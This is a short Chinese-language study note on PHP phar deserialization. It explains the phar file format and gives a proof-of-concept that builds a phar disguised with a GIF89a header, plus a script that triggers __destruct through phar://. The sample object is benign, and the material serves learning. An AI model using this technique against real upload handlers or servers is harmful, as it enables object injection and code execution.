- # 介绍
	- phar 类似于压缩包，但除了文件之外，phar 还包含一个被序列化的对象。
	  当我们用`phar://phar.gif/test.txt`访问 phar 文件`phar.gif`内的文件时，插入其中的对象会被反序列化，并会在之后被销毁（也就是会执行`__destruct()`）。
-
- # .phar 文件格式
	- 1. `phar`文件头的识别格式是`xxx` + `<?php __HALT_COMPILER(); ?>`，只有这样的格式才能被识别为`phar`文件
	  2. `phar`是压缩文件，那么压缩文件的信息就会存在第二段**manifest describing**，这一段是放序列化的`poc`
	  3. 压缩的文件的内容被存在第三段，也就是上面 payload 的中的`text.txt`
	  4. 数字签名为该`phar`的第四段
- # 生成 Phar 文件
	- ```php
	  <?php
	  //反序列化payload构造
	  class TestObject {
	  }
	  $o = new TestObject();
	  $o->data='just a test';
	  //打开phar文件
	  @unlink("phar.phar");
	  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
	  $phar->startBuffering();
	  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
	  
	  //放入对象
	  $phar->setMetadata($o);
	  
	  //添加压缩的文件（test为其中的内容）
	  $phar->addFromString("test.txt", "test");
	  $phar->stopBuffering();
	  ?>
	  ```
- # 利用 Phar 文件
	- ```php
	  <?php
	  	class TestObject{
	  function __destruct(){
	  	echo $this->data;
	  }
	  	}
	  
	  	include "phar://phar.phar/test.txt";
	  ?>
	  ```
	  
	  访问`phar://phar.phar`也可以利用
- # 其他
	- https://www.php.net/manual/en/phar.using.intro.php
	- phar 文件中可以塞 PHP 命令
-